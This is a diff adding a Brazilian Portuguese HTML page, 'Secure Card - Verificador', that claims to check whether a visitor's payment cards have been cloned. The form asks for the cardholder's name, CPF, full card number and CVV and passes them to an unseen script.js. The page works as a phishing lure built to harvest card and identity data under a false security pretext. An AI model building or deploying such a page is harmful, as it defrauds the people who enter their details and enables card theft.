@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>Secure Card - Verificador</title>
+    <style>
+        body { background-color: black; color: white; }
+        h1, h2, h3, p { color: white; }
+        .logo { font-size: 80px; font-weight: bold; margin-bottom: 30px; }
+        hr { color: gray; }
+        footer { padding: 21px; }
+        .form-control { transition: 0.5s; }
+        .form-control:hover { transform: translateY(-5px); }
+        .d-none { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container mt-5">
+        <h1 class="text-center">Seja bem vindo a</h1>
+        <h1 class="logo text-center">Secure Card</h1>
+
+        <h3 class="mb-5 text-center text-secondary">Verifique se seus cartões foram clonados</h3>
+        
+        <div class="form-floating mb-3">
+            <input type="text" class="form-control" id="nomeInput" placeholder="Nome">
+            <label class="text-dark" for="nomeInput">Nome (Igual ao cartão)</label>
+        </div>
+        <div class="form-floating mb-3">
+            <input type="text" class="form-control" id="cpfInput" maxlength="14" placeholder="000.000.000-00">
+            <label class="text-dark" for="cpfInput">CPF do Titular</label>
+        </div>
+        <div class="form-floating mb-3">
+            <input type="text" class="form-control" id="cartaoInput" maxlength="19" placeholder="0000 0000 0000 0000">
+            <label class="text-dark" for="cartaoInput">Número do Cartão</label>
+        </div>
+        <div class="form-floating mb-3">
+            <input type="text" class="form-control" id="cvvInput" maxlength="4" placeholder="000">
+            <label class="text-dark" for="cvvInput">CVV</label>
+        </div>
+
+        <div class="d-flex justify-content-center">
+            <button type="button" class="btn btn-light btn-lg mt-4 w-50" id="btnVerificar">
+                <span class="spinner-border spinner-border-sm d-none" id="spinner"></span>
+                <span id="btnTexto">Verificar Cartão</span>
+            </button>
+        </div>
+        
+        <div id="mensagem" class="alert mt-4 d-none text-center"></div>
+    </div>
+
+    <footer class="mt-5">
+        <hr>
+        <p class="text-center text-secondary">
+            &copy; <span id="anos">2026</span> Secure Card. Todos os direitos reservados.
+        </p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
